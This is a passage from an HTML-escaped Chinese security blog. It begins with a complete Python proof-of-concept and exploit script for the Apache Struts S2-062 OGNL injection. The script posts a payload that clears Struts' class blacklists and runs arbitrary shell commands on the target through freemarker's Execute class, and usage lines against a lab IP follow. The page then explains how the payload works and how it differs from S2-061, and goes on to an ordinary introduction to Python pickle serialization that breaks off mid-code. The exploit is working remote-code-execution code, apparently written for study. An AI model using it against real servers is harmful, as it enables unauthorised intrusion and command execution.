class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def poc(url):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        headers = &amp;#123;&amp;quot;Cache-Control&amp;quot;: &amp;quot;max-age=0&amp;quot;, &amp;quot;Upgrade-Insecure-Requests&amp;quot;: &amp;quot;1&amp;quot;, &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&amp;quot;, &amp;quot;Accept&amp;quot;: &amp;quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;quot;, &amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;, &amp;quot;Accept-Language&amp;quot;: &amp;quot;zh-CN,zh;q=0.9,en;q=0.8&amp;quot;, &amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;, &amp;quot;Content-Type&amp;quot;: &amp;quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = &amp;quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\&amp;quot;id\&amp;quot;\r\n\r\n%&amp;#123;\r\n(#request.map=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get(&amp;#x27;struts.valueStack&amp;#x27;)) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get(&amp;#x27;map&amp;#x27;).get(&amp;#x27;context&amp;#x27;)) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get(&amp;#x27;map2&amp;#x27;).get(&amp;#x27;memberAccess&amp;#x27;)) == true).toString().substring(0,0) +\r\n(#request.get(&amp;#x27;map3&amp;#x27;).put(&amp;#x27;excludedPackageNames&amp;#x27;,#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;.keySet()) == true).toString().substring(0,0) +\r\n(#request.get(&amp;#x27;map3&amp;#x27;).put(&amp;#x27;excludedClasses&amp;#x27;,#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;.keySet()) == true).toString().substring(0,0) +\r\n(#application.get(&amp;#x27;org.apache.tomcat.InstanceManager&amp;#x27;).newInstance(&amp;#x27;freemarker.template.utility.Execute&amp;#x27;).exec(&amp;#123;&amp;#x27;whoami&amp;#x27;&amp;#125;))\r\n&amp;#125;\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        text=requests.post(url, headers=headers, data=data).text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if &amp;quot;id&amp;quot; in text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            print(&amp;quot;发现漏洞&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            page=etree.HTML(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data = page.xpath(&amp;#x27;//a[@id]/@id&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            print(data[0])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;quot;POC检测失败&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def EXP(url,cmd):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        headers = &amp;#123;&amp;quot;Cache-Control&amp;quot;: &amp;quot;max-age=0&amp;quot;, &amp;quot;Upgrade-Insecure-Requests&amp;quot;: &amp;quot;1&amp;quot;, &amp;quot;User-Agent&amp;quot;: &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&amp;quot;, &amp;quot;Accept&amp;quot;: &amp;quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;quot;, &amp;quot;Accept-Encoding&amp;quot;: &amp;quot;gzip, deflate&amp;quot;, &amp;quot;Accept-Language&amp;quot;: &amp;quot;zh-CN,zh;q=0.9,en;q=0.8&amp;quot;, &amp;quot;Connection&amp;quot;: &amp;quot;close&amp;quot;, &amp;quot;Content-Type&amp;quot;: &amp;quot;multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data =&amp;quot;------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\&amp;quot;id\&amp;quot;\r\n\r\n%&amp;#123;\r\n(#request.map=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get(&amp;#x27;struts.valueStack&amp;#x27;)) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get(&amp;#x27;map&amp;#x27;).get(&amp;#x27;context&amp;#x27;)) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get(&amp;#x27;map2&amp;#x27;).get(&amp;#x27;memberAccess&amp;#x27;)) == true).toString().substring(0,0) +\r\n(#request.get(&amp;#x27;map3&amp;#x27;).put(&amp;#x27;excludedPackageNames&amp;#x27;,#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;.keySet()) == true).toString().substring(0,0) +\r\n(#request.get(&amp;#x27;map3&amp;#x27;).put(&amp;#x27;excludedClasses&amp;#x27;,#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;.keySet()) == true).toString().substring(0,0) +\r\n(#application.get(&amp;#x27;org.apache.tomcat.InstanceManager&amp;#x27;).newInstance(&amp;#x27;freemarker.template.utility.Execute&amp;#x27;).exec(&amp;#123;&amp;#x27;id&amp;#x27;&amp;#125;))\r\n&amp;#125;\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94&amp;quot;.replace(&amp;quot;exec(&amp;#123;&amp;#x27;id&amp;quot;,&amp;quot;exec(&amp;#123;&amp;#x27;&amp;quot;+cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        text=requests.post(url, headers=headers, data=data).text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if &amp;quot;id&amp;quot; in text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            print(&amp;quot;命令回显&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            page=etree.HTML(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data = page.xpath(&amp;#x27;//a[@id]/@id&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            print(data[0])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;quot;EXP检测失败&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser = argparse.ArgumentParser(description=&amp;#x27;S2-062验证&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser.add_argument(&amp;#x27;--url&amp;#x27;, help=&amp;quot;要验证的URL&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    parser.add_argument(&amp;#x27;--cmd&amp;#x27;,help=&amp;quot;你想执行的命令&amp;quot;,default=&amp;quot;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    args = parser.parse_args()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if args.cmd !=&amp;quot;&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        EXP(args.url,args.cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        poc(args.url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3MyLTA2Mi5weQ==&#34;&gt;s2-062.py&lt;/span&gt; --url &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==&#34;&gt;http://192.168.142.128:18080&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3MyLTA2Mi5weQ==&#34;&gt;s2-062.py&lt;/span&gt; --url &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MA==&#34;&gt;http://192.168.142.128:18080&lt;/span&gt; --cmd whoami&lt;/p&gt;
&lt;p&gt;OGNI 表达式&lt;/p&gt;
&lt;p&gt;一种开源的 Java 表达式语言&lt;/p&gt;
&lt;p&gt;用于对数据进行访问，拥有类型转换、访问对象方法、操作集合对象等功能&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1、OGNL 是 Struts 默认支持的表达式语言&lt;/p&gt;
&lt;p&gt;2、OGNL 可以取值赋值、访问类的静态方法和属性&lt;/p&gt;
&lt;p&gt;3、访问 OGNL 上下文。Struts 的上下文根对象：ValueStack&lt;/p&gt;
&lt;p&gt;4、%{} 用来把字符串转换成表达式&lt;/p&gt;
&lt;p&gt;%25 就是 URL 编码的 %&lt;/p&gt;
&lt;p&gt;5、可以在 struts.xml 和 struts 标签等地方使用 OGNL 表达式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;漏洞分析&lt;/p&gt;
&lt;p&gt;项目使用了 %{} 解析 OGNL 表达式，对用户输入的内容进行二次解析的时候，如果没有验证，可能导致远程代码执行&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;InstanceManager：用于实例化任意对象&lt;/p&gt;
&lt;p&gt;BeanMap：可以调用对象的 getter、setter，&lt;/p&gt;
&lt;p&gt;setBean () 可以更新对象&lt;/p&gt;
&lt;p&gt;valueStack：ONGL 的根对象&lt;/p&gt;
&lt;p&gt;memberAccess：控制对象的访问&lt;/p&gt;
&lt;p&gt;setExcludedPackageNames()&lt;/p&gt;
&lt;p&gt;setExcludedClasses () 清除黑名单&lt;/p&gt;
&lt;p&gt;Execute 类：黑名单类，exec 可以执行 Shell&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用 Beanmap 获取 valueStack，清空黑名单，setBean 更新生效，实例化 exec 类执行代码&lt;/p&gt;
&lt;p&gt;黑名单内容：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190046216.png&#34; alt=&#34;image-20221126190046216&#34;&gt;`&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126190030752.png&#34; alt=&#34;image-20221126190030752&#34;&gt;`&lt;/p&gt;
&lt;p&gt;struct061 和 struct062payload 区别&lt;/p&gt;
&lt;p&gt;#request.map=#application.get(‘org.apache.tomcat.InstanceManager’).newInstance(‘org.apache. commons.collections.BeanMap’)).toString().substring(0,0)&lt;/p&gt;
&lt;p&gt;s2-062 改成了：&lt;/p&gt;
&lt;p&gt;#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0)&lt;/p&gt;
&lt;h2 id=&#34;3python&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3python&#34;&gt;#&lt;/a&gt; 3.python&lt;/h2&gt;
&lt;p&gt;python 反序列化和 php 反序列化类似，相当于把程序运行时产生的变量，字典，对象实例等变换成字符串形式存储起来，可以实现内存中的对象与方便持久化在磁盘中或在网络中进行交互的数据格式（str、bites) 之间的相互转换。&lt;/p&gt;
&lt;p&gt;Python 中提供 pickle 和 json 两个模块来实现序列化与反序列化，pickle 模块和 json 模块 dumps ()、dump ()、loads ()、load () 这是个函数，其中 dumps ()、dump () 用于实现序列化，loads ()、load () 用于实现反序列化。&lt;/p&gt;
&lt;h3 id=&#34;pickle&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pickle&#34;&gt;#&lt;/a&gt; pickle&lt;/h3&gt;
&lt;p&gt;python 中 pickle 反序列化的库主要有两个， &lt;code&gt;pickle&lt;/code&gt;  和 &lt;code&gt;cPickle&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a_list = [&amp;#x27;a&amp;#x27;,&amp;#x27;b&amp;#x27;,&amp;#x27;c&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# pickle构造出的字符串，有很多个版本。在dumps或loads时，可以用Protocol参数指定协议版本，例如指定为0号版本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;序列化：dumps()、dump()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;反序列化：loads()、load()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# pickle.dumps将对象序列化为字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# pickle.dump将序列化后的字符串存储为文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pickle.dumps(a_list,protocol=0))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.loads() #对象反序列化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pickle.load() #对象反序列化，从文件中读取数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对象序列化与反序列化&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list1 = [&amp;#x27;aa&amp;#x27;,&amp;#x27;bb&amp;#x27;,&amp;#x27;cc&amp;#x27;,True,199]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pickle.dumps(list1,protocol=0))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pickle.dumps(list1,protocol=2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pickle.dumps(list1,protocol=3))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pickle.dumps(list1,protocol=4))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;(lp0\nVaa\np1\naVbb\np2\naVcc\np3\naI01\naI199\na.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x02]q\x00(X\x02\x00\x00\x00aaq\x01X\x02\x00\x00\x00bbq\x02X\x02\x00\x00\x00ccq\x03\x88K\xc7e.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x03]q\x00(X\x02\x00\x00\x00aaq\x01X\x02\x00\x00\x00bbq\x02X\x02\x00\x00\x00ccq\x03\x88K\xc7e.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&amp;#x27;\x80\x04\x95\x17\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x02aa\x94\x8c\x02bb\x94\x8c\x02cc\x94\x88K\xc7e.&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(pickle.loads(b&amp;#x27;\x80\x04\x95\x0b\x00\x00\x00\x00\x00\x00\x00]\x94(K\x01K\x02K\x03e.&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1, 2, 3]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;文件中序列化&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list1 = [&amp;#x27;aa&amp;#x27;,&amp;#x27;bb&amp;#x27;,&amp;#x27;cc&amp;#x27;,True,199]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;with open(&amp;quot;shabi.txt&amp;quot;,&amp;#x27;wb&amp;#x27;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pickle.dump(list1,f,protocol=0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124095501120.png&#34; alt=&#34;image-20221124095501120&#34;&gt;`&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file=open(&amp;quot;shabi.txt&amp;quot;,&amp;quot;rb&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=pickle.load(file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(p)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124100423319.png&#34; alt=&#34;image-20221124100423319&#34;&gt;`&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。&lt;/p&gt;
&lt;p&gt;v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。&lt;/p&gt;
&lt;p&gt;v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。&lt;/p&gt;
&lt;p&gt;v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。&lt;/p&gt;
&lt;p&gt;v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;另外有一点需要注意：对于我们自己定义的 class，如果直接以形如 &lt;code&gt;date = 20191029&lt;/code&gt;  的方式赋初值，** 则这个 &lt;code&gt;date&lt;/code&gt;  不会被打包！** 解决方案是写一个 &lt;code&gt;__init__&lt;/code&gt; 方法， 也就是这样：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;dairy&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    date = &lt;span class=&#34;number&#34;&gt;1111111&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    text = &lt;span class=&#34;string&#34;&gt;&amp;#x27;sb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    todo = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;zz&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span 